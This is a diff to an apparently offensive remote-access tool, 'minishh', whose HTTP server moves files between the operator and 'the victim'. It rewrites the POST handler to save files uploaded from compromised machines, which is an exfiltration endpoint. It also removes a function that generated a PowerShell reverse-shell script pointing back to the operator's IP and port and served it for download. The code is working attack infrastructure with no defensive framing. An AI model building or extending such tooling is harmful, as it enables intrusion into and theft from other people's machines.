@@ -5,6 +5,7 @@ from threading import Thread, Event
 from requests_toolbelt.multipart import decoder
 import os
 import requests
+from utils.minishh_utils import MinishhUtils
 from utils.pwsh_utils import ReverseShell
 from utils.print_utils import Printer
 from config.config import AppConfig
@@ -16,7 +17,7 @@ class ServerStatus(Enum):
 class HttpDeliveringServer(BaseHTTPRequestHandler):
 
     files_to_deliver = {"tmp_routes": {}, "permanent_routes": {}}
-    files_to_receive = {"/upload": ""}
+    files_to_receive = {}
 
     def __init__(self, *args, **kwargs):
         self.server_version = "MinishhHttp/0.8"
@@ -84,22 +85,34 @@ class HttpDeliveringServer(BaseHTTPRequestHandler):
     def do_POST(self):
         """
         Method allowing file transfer between minishh server and the victim
+        This method download file from post method
+
+        It works with and without multipart
         """
         try:
             content_type = self.headers.get("Content-Type")
-            if (content_type is not None and 'boundary=' in content_type and self.path == '/upload'):
-                post_request = self.rfile.read1()
+            post_request = self.rfile.read1()
+            filename = HttpDeliveringServer.files_to_receive.get(self.path.lstrip("/"))
+            if (content_type is not None and 'boundary=' in content_type and filename != ""):
                 multipart_data = decoder.MultipartDecoder(post_request, content_type)
                 for part in multipart_data.parts:
                     # Do save file
-                    print(part.content) # part.headers contains the file_name
-                
+                    MinishhUtils.save_file(filename, part.content)
+                    break
+
                 self.send_response(HTTPStatus.OK)
                 self.end_headers()
+
+            elif len(post_request) > 0:
+                self.send_response(HTTPStatus.OK)
+                self.end_headers()
+                MinishhUtils.save_file(filename, post_request)
 
             else:
                 self.send_response(HTTPStatus.NOT_FOUND)
                 self.end_headers()
+
+            self.remove_file_upload(self.path.lstrip("/"))
 
         except Exception as e:
             Printer.err(e)
@@ -107,12 +120,14 @@ class HttpDeliveringServer(BaseHTTPRequestHandler):
 
     def log_message(self, format, request_proto, status_code, *args):
         splited_req = request_proto.split()
+        verb = splited_req[0]
         route = request_proto
         if len(splited_req) >= 2:
             route = splited_req[1]
 
-        if int(status_code) == HTTPStatus.OK:
-            Printer.cr().dbg(f'File downloaded [green]successfully[/green] from {self.address_string()} -->  [blue]{route}[/blue]')
+        if(int(status_code) == HTTPStatus.OK and verb == "GET"):
+            Printer.dbg(f'File downloaded [green]successfully[/green] from {self.address_string()} -->  [blue]{route}[/blue]')
+
 
 class HttpServer(Thread):
     """
@@ -133,18 +148,6 @@ class HttpServer(Thread):
             HttpDeliveringServer.notify_download(route, filename)
         else:
             Printer.err("Http server is not running...")
-
-    def prepare_rev_shell_script(self):
-        script_name = AppConfig.get("rev_shell_name", "Script")
-        ip_addr = AppConfig.get("default_ip_address")
-        route = "route_for_rev_shell.log"
-        script_content = ReverseShell(ip_addr, AppConfig.get("listening_port", "Connections")).get_content()
-        with open(script_name, 'w') as f:
-            f.write(script_content)
-
-        HttpDeliveringServer.add_permanent_route(route, script_name)
-
-        return self.download_link_powershell(route)
 
     def add_permanent_route(self, route, script_name):
         HttpDeliveringServer.add_permanent_route(route, script_name)
